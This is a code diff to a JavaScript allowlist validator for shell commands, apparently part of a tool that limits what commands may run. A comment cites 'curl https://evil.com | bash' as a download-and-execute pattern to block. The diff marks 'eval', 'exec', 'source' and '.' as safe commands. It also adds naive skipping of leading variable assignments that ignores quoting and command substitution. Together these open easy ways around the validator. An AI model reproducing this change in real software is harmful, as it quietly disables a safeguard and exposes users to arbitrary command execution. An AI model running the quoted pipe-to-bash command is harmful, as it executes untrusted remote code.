@@ -116,6 +116,48 @@ function getRegisteredCommands() {
  * - While blocking dangerous patterns (curl https://evil.com | bash)
  */
 const SAFE_COMMANDS_ALLOWLIST = [
+  // Shell built-in commands (essential for scripting)
+  // These are not external programs - they are part of the shell itself
+  'for', // for loops
+  'while', // while loops
+  'until', // until loops
+  'if', // conditionals
+  'then', // if-then clause
+  'else', // if-else clause
+  'elif', // else-if clause
+  'fi', // end if
+  'case', // case/switch statements
+  'esac', // end case
+  'select', // menu selection
+  'do', // loop body start
+  'done', // loop body end
+  'in', // for-in loop keyword
+  '[', // test command (bracket form)
+  '[[', // extended test command
+  'true', // always succeeds
+  'false', // always fails
+  'test', // test command
+  'set', // set shell options
+  'export', // export environment variables
+  'source', // source a script
+  '.', // source (dot notation)
+  'eval', // evaluate expression
+  'exec', // execute command
+  'exit', // exit shell
+  'return', // return from function
+  'break', // break loop
+  'continue', // continue loop
+  'shift', // shift positional params
+  'trap', // trap signals
+  'wait', // wait for background jobs
+  'read', // read input
+  'printf', // formatted print
+  'local', // local variable
+  'declare', // declare variable
+  'typeset', // type variable
+  'readonly', // readonly variable
+  'unset', // unset variable
+
   // Read-only filesystem commands
   'ls',
   'dir',
@@ -217,7 +259,35 @@ function validateCommand(commandString) {
   }
 
   // Extract the command name (first token)
-  const trimmed = commandString.trim();
+  let trimmed = commandString.trim();
+
+  // Handle variable assignments at the start (VAR=value; cmd or VAR=value cmd)
+  // Variable assignments are safe and should be skipped to find the actual command
+  // Pattern: identifier=value followed by semicolon/space or end of string
+  while (/^[a-zA-Z_][a-zA-Z0-9_]*=/.test(trimmed)) {
+    // Skip past the variable assignment
+    const nextSemicolon = trimmed.indexOf(';');
+    const nextSpace = trimmed.indexOf(' ');
+
+    if (nextSemicolon === -1 && nextSpace === -1) {
+      // Pure variable assignment with no command (e.g., "FOO=bar")
+      return { valid: true, error: '', hasValidator: false, reason: 'variable_assignment' };
+    }
+
+    // Find the next token (after ; or space)
+    const separator =
+      nextSemicolon !== -1 && (nextSpace === -1 || nextSemicolon < nextSpace)
+        ? nextSemicolon
+        : nextSpace;
+
+    trimmed = trimmed.slice(separator + 1).trim();
+
+    // If nothing left after the assignment, it's just a variable assignment
+    if (!trimmed) {
+      return { valid: true, error: '', hasValidator: false, reason: 'variable_assignment' };
+    }
+  }
+
   const firstSpace = trimmed.indexOf(' ');
   const commandName = firstSpace === -1 ? trimmed : trimmed.slice(0, firstSpace);
 
